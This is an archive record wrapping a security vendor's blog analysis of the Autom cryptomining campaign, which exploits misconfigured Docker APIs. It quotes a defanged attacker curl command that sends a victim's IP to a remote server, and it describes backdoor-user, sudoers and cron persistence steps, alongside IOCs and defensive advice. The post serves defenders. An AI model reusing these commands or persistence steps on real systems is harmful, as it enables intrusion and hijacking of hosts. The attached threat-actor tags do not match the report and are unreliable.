{
    "id": "70bde981-8656-41de-a5ca-d31565b59e81",
    "created_at": "2023-01-12T15:01:51.776799Z",
    "updated_at": "2025-03-27T02:09:07.83959Z",
    "deleted_at": null,
    "sha1_hash": "81e2940328c14c5b89412bb6a133c50179880ef9",
    "title": "2021-12-29 - Threat Alert- Evolving Attack Techniques of Autom Cryptomining Campaign",
    "authors": "",
    "file_creation_date": "2022-05-29T01:36:51Z",
    "file_modification_date": "2022-05-29T01:36:51Z",
    "file_size": 641857,
    "plain_text": "# Threat Alert: Evolving Attack Techniques of Autom Cryptomining Campaign\n\n**[blog.aquasec.com/attack-techniques-autom-cryptomining-campaign](https://blog.aquasec.com/attack-techniques-autom-cryptomining-campaign)**\n\nNitzan Yaakov\n\nNitzan Yaakov\n\nDecember 29, 2021\n\n\n-----\n\nOver the past three years, we at Team Nautilus have been tracking an ongoing cryptomining\ncampaign attacking our honeypots. It got the name Autom due to a shell script that was\ndownloaded and that initiated the attack. Through the years, the campaign has evolved,\ndemonstrating new techniques to hide the attack. In this blog, we examine the campaign, its\ntechniques, and how organizations can protect against similar threats.\n\n## The Autom campaign by the numbers\n\nWe first observed the attack in 2019, when a malicious command was executed during the\nrun of a vanilla image alpine:latest, which downloaded the autom.sh shell script. Adversaries\ncommonly use vanilla images along with malicious commands to perform their attacks,\nbecause most organizations trust the official images and allow their use.\n\nOver the years, the malicious command that was added to the official image to carry out the\nattack has barely changed. The main difference is the server from which the shell script\nautom.sh was downloaded.\n\nSince the first attack, we’ve seen 84 attacks using the same shell script. The number of the\nattacks on our honeypots has varied over the three years:\n\n## Mapping the campaign to the MITRE ATT&CK framework\n\nOur investigation showed that the attackers have been using some common techniques\nthroughout the campaign. However, the defense evasion tactics have evolved:\n\n\n-----\n\nIn 2020, the attackers were evading defense by bypassing security features, while in 2021\nthey started using an obfuscating script for this goal.\n\n### The Autom campaign: Common techniques\n\nDuring the campaign, the adversaries have been initiating the attack using the same entry\npoint. The attack is executed from a remote server that searches for vulnerable hosts to\nexploit misconfigured Docker APIs. The adversaries are running the vanilla image\nalpine:latest with a malicious command that downloads the shell script autom.sh, which\ninitiates the attack.\n\nAfter the execution of the shell script autom.sh, the adversaries create a user by two\nmethods, adduser and useradd, under the name akay.\n\nadduser is used to add users by setting up the account’s home folder and other\nsettings\nuseradd is a low-level utility command for adding users.\n\nAfter creating the user and setting home directory (with -m flag) and encrypted password, the\nnew user is added to supplementary groups (it’s not the primary group of the user, but it\nmight belong to this group as well).\n\nThe newly created user is not privileged. To change this, the adversaries use the sudo prefix\nto provide privileges. After granting the user privileges and turning it into a root user, it gets\nunlimited privileges with the ability to run any command sudoers file, which controls how\nsudo works on your machine. This ability is granted using the command ALL=(ALL:ALL) ALL.\nAs you can see below, the attackers enable password login to the SSH server for\nauthentication:\n\n\n-----\n\nTo get the public IP address of the compromised host, the adversaries use the domain\nicanhazip[.]com. Then, this IP address is used to download a file from the remote server\n185[.]164[.]72[.]119 (curl http[:]//185[.]164[.]72[.]119/ip.php?ip=$ip).\n\nThe steps described above create a backdoor that grants the adversaries persistence on the\ncompromised host. It was achieved by the username, password, and IP address that are\nnecessary to establish an SSH connection.\n\nThe attack kill chain mapped to the MITRE framework above shows that the adversaries\nused the same tactics over the three years. They used the same initial access, executed the\nautom.sh shell script, and created a user account to gain persistence on the compromised\nhost, to eventually achieve the goal of the attack: mining cryptocurrency.\n\n**How the Autom campaign evolved**\n\nWe saw the progression of the campaign in the tactics that the adversaries use to avoid\ndetection. In 2019, the attack didn’t use any special techniques for hiding the cryptomining\nactivity. In 2020, the adversaries were trying to conceal themselves and, therefore, disabled\nsecurity mechanisms. At first, they disabled ufw (Uncomplicated Firewall), which enables\nusers to allow or deny access to a service. Later, they disabled NMI (non-maskable\ninterrupt), which is the highest-priority interrupt that typically occurs to signal attention for\nnon-recoverable hardware errors and is used to monitor system resets.\n\nIn 2021, the adversaries added a new technique. To hide the cryptomining activity, they\ndownloaded an obfuscated shell script from a remote server. They encoded the script in\nbase64 five times to prevent security tools from reading it and understanding the intentions\nbehind it. Decoding the script revealed the mining activity.\n\nFurthermore, the adversaries were adding concealment capabilities. This involves\ndownloading the log_rotate.bin script, which launches the cryptomining activity by creating a\nnew cron job that will initiate mining every 55 minutes on the compromised host.\n\nThroughout the years, the shell script was downloaded from five servers:\n\n\n-----\n\nThe chart above illustrates the number of times the shell script was downloaded from a\nremote server between 2019 and 2021. We can see the highest number of downloads in\n2020 was from the remote server 88[.]218[.]17[.]151, which is also used as the attacker’s\nhost in 24 other attacks that occurred in 2020 and 2021.\n\nIn 2021, we saw a decrease in the attacks against our honeypots. However, searching for\nthe attack using Shodan revealed that it did not slow down. During Q3 2021, we observed\n125 attacks in the wild using the same server (88[.]218[.]17[.]151) to download the malicious\nshell script.\n\nThis decrease in attacks on our honeypots might imply that the attackers identified them and\ntherefore reduced the volume of their attacks in 2021. It seems that the group behind the\nattack has developed their skills to expand the attack surface and spread their attack.\n\n**Protecting against evolving threats**\n\nThe Autom campaign illustrates that attackers are becoming more sophisticated, continually\nimproving their techniques and their ability to avoid detection by security solutions.\nOrganizations need to stay on top of the threat landscape to be prepared to defend\nthemselves from the attacks that constantly evolve and change their shape.\n\nTo protect against the Autom attack and similar threats, we recommend following these best\npractices while working with container environments:\n\n**Perform dynamic image analysis. Dynamic image analysis tools can help detect hidden**\nand sophisticated threats in container images that often are missed by static scanners. Aqua\nDTA (Dynamic Threat Analysis)uncovers malicious elements in container images by running\nthem in a secure sandbox to analyze their behavior before they are pushed to production.\n\n\n-----\n\n**Monitor container activity. Container monitoring is a fundamental practice to help mitigate**\nissues quickly and minimize disruptions. The monitoring process also applies to the runtime\nenvironment where suspicious activity can occur (e.g., download of malicious scripts).\n\nIn the Autom campaign, the attackers exploited a misconfigured Docker API to run a vanilla\ncontainer image alpine:latest. Most organizations would have allowed this image to run.\n[Runtime protection solutions such as Aqua’s CNDR are designed to detect unknown threats](https://blog.aquasec.com/cndr-ebpf-cloud-native-detection-and-response)\nand suspicious behavior during runtime. Moreover, [drift prevention would have blocked the](https://blog.aquasec.com/cloud-native-security-drift-prevention)\nexecution of the file that was downloaded from a remote source during runtime and was not\npart of the original container image.\n\n**Check your environment for misconfigured APIs.** Cloud Security Posture Management\n(CSPM) solutions can remediate configuration issues and strengthen your overall security\nposture.\n\n**Limit unsecured inbound or outbound communication and unrestricted network traffic in**\nyour environment. Using the Aqua platform, you can set up micro-segmentation policies to\ndetermine acceptable traffic between nodes, clusters, and hosts, and Kubernetes assurance\npolicies to dictate the Kubernetes configurations that must be present for a workload to be\nallowed to run.\n\nIOC’s table\n\n**_Indicators of Compromise (IOCs)_**\n\nAutom.sh\n\nMd5 c5968e2332b488076f592535c0be2473\nMd5 87e4701ccb615adc2abc82d9282d65a1\nMd5 87e4701ccb615adc2abc82d9282d65a1\n\nlog_rotate_bin\n\nMd5 fb1fde1f28b2743b0f4cbb60609df95a\nMd5 1a882366d180331e5ffcb973719312d9\nMd5 ced5e2d876e8264beeade2efca075f09\n\n\n-----\n\n**Nitzan Yaakov**\n\nNitzan is a Security Data Analyst at Team Nautilus, Aqua’s research team. She focuses on\nanalyzing attacks in cloud native environments and researching new techniques used by\nadversaries. Outside of work, she enjoys baking and experimenting with new dessert recipes\nas well as doing sports such as Kangoo Jumps and pilates.\n\n[Security Threats](https://blog.aquasec.com/topic/security-threats)\n\n[Tweet](https://twitter.com/share)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-29 - Threat Alert- Evolving Attack Techniques of Autom Cryptomining Campaign.pdf"
    ],
    "report_names": [
        "2021-12-29 - Threat Alert- Evolving Attack Techniques of Autom Cryptomining Campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "6ad410c7-e291-4327-a54b-281c23f0d4fa",
            "created_at": "2022-10-25T16:07:24.501468Z",
            "updated_at": "2025-03-27T02:02:10.26052Z",
            "deleted_at": null,
            "main_name": "Karakurt",
            "aliases": [],
            "source_name": "ETDA:Karakurt",
            "tools": [
                "7-Zip",
                "Agentemis",
                "AnyDesk",
                "Cobalt Strike",
                "CobaltStrike",
                "FileZilla",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "WinZip",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2af9bea3-b43e-4a6d-8dc6-46dad6e3ff24",
            "created_at": "2022-10-25T16:47:55.853415Z",
            "updated_at": "2025-03-27T02:05:17.401138Z",
            "deleted_at": null,
            "main_name": "GOLD TOMAHAWK",
            "aliases": [
                "Karakurt Lair",
                "Karakurt Team",
                "Karakurt"
            ],
            "source_name": "Secureworks:GOLD TOMAHAWK",
            "tools": [
                " AnyDesk",
                " MEGA",
                " QuickPacket",
                " Rclone",
                " SendGB",
                "7-ZIP"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535711,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653788211,
    "ts_modification_date": 1653788211,
    "files": {
        "pdf": "https://archive.orkl.eu/81e2940328c14c5b89412bb6a133c50179880ef9.pdf",
        "text": "https://archive.orkl.eu/81e2940328c14c5b89412bb6a133c50179880ef9.txt",
        "img": "https://archive.orkl.eu/81e2940328c14c5b89412bb6a133c50179880ef9.jpg"
    }
}